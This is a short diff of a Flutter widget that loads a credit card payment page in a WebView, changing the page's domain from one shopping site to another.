@@ -47,7 +47,7 @@ class _CreditCardsState extends State<CreditCards> {
 
   Widget customBody(String params) {
     return WebView(
-      initialUrl: "https://shopping-il.com/creditCardPayment.php?" + params,
+      initialUrl: "https://6yamim.xyz/creditCardPayment.php?" + params,
       javascriptMode: JavascriptMode.unrestricted,
       onWebViewCreated: (WebViewController webViewController) async {
         //_controller.complete(webViewController);
